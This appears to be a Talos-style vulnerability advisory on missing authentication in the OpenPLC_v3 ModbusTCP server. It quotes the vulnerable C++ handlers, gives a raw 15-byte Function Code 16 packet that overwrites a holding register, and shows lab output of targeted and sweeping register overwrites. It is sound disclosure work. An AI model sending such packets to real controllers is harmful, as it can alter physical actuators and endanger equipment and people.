# Talos Vulnerability Report

## OpenPLC OpenPLC_v3 ModbusTCP server unrestricted holding register write vulnerability

##### CVE Number

[Pending]

##### SUMMARY

An unrestricted write vulnerability exists in the ModbusTCP server functionality of OpenPLC _v3. A specially crafted Modbus TCP request with Function Code 16 (Write Multiple Registers) can lead to arbitrary modification of any holding register across the entire address space (0–8191), including registers that directly drive physical actuators. An unauthenticated attacker can send a single network request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable.

OpenPLC _v3 master branch (all versions using `webserver/core/modbus.cpp`)

##### PRODUCT URLS

OpenPLC_v3 - [https://github.com/thiagoralves/OpenPLC_v3](https://github.com/thiagoralves/OpenPLC_v3)

##### CWE

CWE-306 - Missing Authentication for Critical Function

##### DETAILS

OpenPLC is an open-source programmable logic controller (PLC) designed to provide a low cost option for automation. The platform consists of two parts: the Runtime and the Editor. The Runtime can be deployed on a variety of platforms including Windows, Linux, and various microcontrollers. Common uses for OpenPLC include home automation and industrial security research. OpenPLC supports communication across a variety of protocols, including Modbus and EtherNet/IP.

An unrestricted write condition exists in OpenPLC's handling of Modbus Function Code 16 (Write Multiple Registers). The server accepts FC=16 requests from any network client without authentication, authorization, or access control on the target register addresses. An attacker who can reach TCP port 502 can overwrite any holding register, including registers mapped to IEC 61131-3 analog output variables (`%QW`) that directly control physical actuators such as valve positions, motor speeds, and temperature setpoints.

OpenPLC's processing of Modbus messages begins in `server.cpp` in the function `startServer` where an infinite loop waits for new connections on TCP/502. When a client connects, a new thread calling `handleConnections` is created. The handler calls `processMessage()` ([1]), which dispatches to `processModbusMessage()`:

```
void processMessage(unsigned char *buffer, int bufferSize, int client_fd, int protocol_type)
{
    int messageSize = 0;
    if (protocol_type == MODBUS_PROTOCOL)
    {
        messageSize = processModbusMessage(buffer, bufferSize);  // [1]
    }
    while (messageSize > 0)
    {
        ssize_t bytesWritten = write(client_fd, buffer, messageSize);
        // ...
    }
}
```

Inside `processModbusMessage()`, the function code at `buffer[7]` is checked and dispatched. No authentication or client identity check occurs at any point ([2]):

```
int processModbusMessage(unsigned char *buffer, int bufferSize)
{
    MessageLength = 0;
    uint16_t field1 = (uint16_t)buffer[8] << 8 | (uint16_t)buffer[9];
    uint16_t field2 = (uint16_t)buffer[10] << 8 | (uint16_t)buffer[11];
    // ...

    else if(buffer[7] == MB_FC_WRITE_MULTIPLE_REGISTERS)  // FC=16 (0x10)
    {
        WriteMultipleRegisters(buffer, bufferSize);  // [2] no auth check
    }
    // ...
}
```

The `WriteMultipleRegisters()` function extracts the Starting Address from `buffer[8..9]` ([3]) and iterates over each register, calling `writeToRegisterWithoutLocking()` for each value ([4]):

```
void WriteMultipleRegisters(unsigned char *buffer, int bufferSize)
{
    int Start, WordDataLength, ByteDataLength;
    int mb_error = ERR_NONE;

    if (bufferSize < 12)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    Start = word(buffer[8], buffer[9]);              // [3] attacker-controlled
    WordDataLength = word(buffer[10], buffer[11]);
    ByteDataLength = WordDataLength * 2;

    if ((bufferSize < (13 + ByteDataLength)) || (buffer[12] != ByteDataLength))
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    pthread_mutex_lock(&bufferLock);
    for(int i = 0; i < WordDataLength; i++)
    {
        int position = Start + i;
        int error = writeToRegisterWithoutLocking(    // [4] direct write
            position,
            word(buffer[13 + i * 2], buffer[14 + i * 2])
        );
        if (error != ERR_NONE)
            mb_error = error;
    }
    pthread_mutex_unlock(&bufferLock);
    // ...
}
```

The `writeToRegisterWithoutLocking()` function maps the register address to PLC internal memory. For addresses 0–1023, it writes directly to `int_output[]` — the analog output variables that control physical actuators ([5]):

```
int writeToRegisterWithoutLocking(int position, uint16_t value)
{
    if (position < MIN_16B_RANGE)    // addresses 0–1023
    {
        if (int_output[position] != NULL)
            *int_output[position] = value;  // [5] direct write to physical output
    }
    else if (position >= MIN_16B_RANGE && position <= MAX_16B_RANGE)  // 1024–2047
    {
        if (int_memory[position - MIN_16B_RANGE] != NULL)
            *int_memory[position - MIN_16B_RANGE] = value;
    }
    else if (position >= MIN_32B_RANGE && position <= MAX_32B_RANGE)  // 2048–4095
    {
        // writes to dint_memory[]
    }
    else if (position >= MIN_64B_RANGE && position <= MAX_64B_RANGE)  // 4096–8191
    {
        // writes to lint_memory[]
    }
    else
        return ERR_ILLEGAL_DATA_ADDRESS;

    return ERR_NONE;
}
```

At no point in this chain is any authentication, authorization, or access control check performed. The entire address space of 8,192 holding registers across four PLC memory regions (analog outputs, 16-bit memory, 32-bit memory, 64-bit memory) is writable by any network client.

Knowing this, it is possible to overwrite any holding register by sending a single FC=16 request. The following 15-byte Modbus TCP request overwrites register `0x0064` (decimal 100, mapped to `%QW100`) with the value `0x0384` (decimal 900):

```
00 01 00 00 00 09 01 10 00 64 00 01 02 03 84
```

To verify the vulnerability, a test environment was set up with OpenPLC v3 running in a Docker container (debian:trixie) with a Modbus-enabled IEC 61131-3 program exposing holding registers at `%QW0`–`%QW3`. A Python script using raw TCP sockets was used to send FC=16 requests and FC=03 read-back requests.

**Precision attack** — overwrite register 0x0064 while sentinels are unchanged:

```
Pre-attack state:
  reg[99]  (0x0063) = 1111   ← sentinel
  reg[100] (0x0064) =  150   ← target register
  reg[101] (0x0065) = 3333   ← sentinel

TX: 00 03 00 00 00 09 01 10 00 64 00 01 02 03 84
RX: 00 03 00 00 00 06 01 10 00 64 00 01   ← normal response (write confirmed)

Post-attack state:
  reg[99]  (0x0063) = 1111   ← UNCHANGED
  reg[100] (0x0064) =  900   ← OVERWRITTEN (150 → 900)
  reg[101] (0x0065) = 3333   ← UNCHANGED
```

**Address space sweep** — five addresses across the holding register space:

```
Address 0x0000 (dec 0):   written=500, read-back=500  ✓
Address 0x0032 (dec 50):  written=600, read-back=600  ✓
Address 0x0064 (dec 100): written=700, read-back=700  ✓
Address 0x00C8 (dec 200): written=800, read-back=800  ✓
Address 0x01F4 (dec 500): written=999, read-back=999  ✓
```

All five addresses are writable without authentication, confirming the entire holding register address space is unprotected.
